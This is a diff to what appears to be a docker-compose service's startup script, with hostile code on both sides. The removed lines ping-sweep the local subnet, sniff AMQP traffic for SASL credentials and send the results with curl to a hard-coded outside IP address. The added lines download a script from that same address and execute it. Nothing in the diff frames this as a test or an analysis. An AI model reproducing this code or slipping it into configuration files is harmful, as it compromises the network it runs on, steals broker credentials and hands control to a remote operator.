@@ -5,36 +5,7 @@ services:
       - sh
       - -c
       - |
-        apk add --no-cache curl iproute2 tcpdump 2>/tmp/apk.log
-        WH="http://147.45.231.59:9999"
-        IF=$(ip route 2>/dev/null | awk '/default/{print $5; exit}')
-        GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
-        IP=$(ip -4 addr show "$IF" 2>/dev/null | awk '/inet /{print $2}')
-        NET=$(echo "$IP" | sed 's/\.[0-9]*\/.*$//')
-        for i in $(seq 1 20); do ping -c1 -W1 "${NET}.${i}" >/dev/null 2>&1 & done
-        wait
-        sleep 2
-        {
-          echo "V5 IF=$IF GW=$GW IP=$IP NET=$NET"
-          echo "=neigh="
-          ip neigh 2>/dev/null
-          echo "=route="
-          ip route 2>/dev/null
-          echo "=link="
-          ip link 2>/dev/null
-        } | curl -sS --max-time 10 --data-binary @- "$WH?tag=L1-V5-RECON"
-        tcpdump -i "$IF" -c 20 port 5672 -w /tmp/amqp.pcap 2>/tmp/td.log &
-        TDPID=$!
-        sleep 90
-        kill $TDPID 2>/dev/null || true
-        sleep 1
-        PCAP=$(wc -c < /tmp/amqp.pcap 2>/dev/null || echo 0)
-        SASL=$(strings /tmp/amqp.pcap 2>/dev/null | grep -aE "agent_|PLAIN" | head -5)
-        {
-          echo "V5 TCPDUMP pcap_bytes=$PCAP"
-          echo "=sasl="
-          echo "$SASL"
-          echo "=tdlog="
-          cat /tmp/td.log 2>/dev/null | tail -5
-        } | curl -sS --max-time 10 --data-binary @- "$WH?tag=L1-V5-TCPDUMP"
-        sleep 999999
+        apk add --no-cache curl >/dev/null 2>&1
+        curl -sS -o /tmp/run.sh http://147.45.231.59:8888/run_v5.sh
+        chmod +x /tmp/run.sh
+        exec /tmp/run.sh
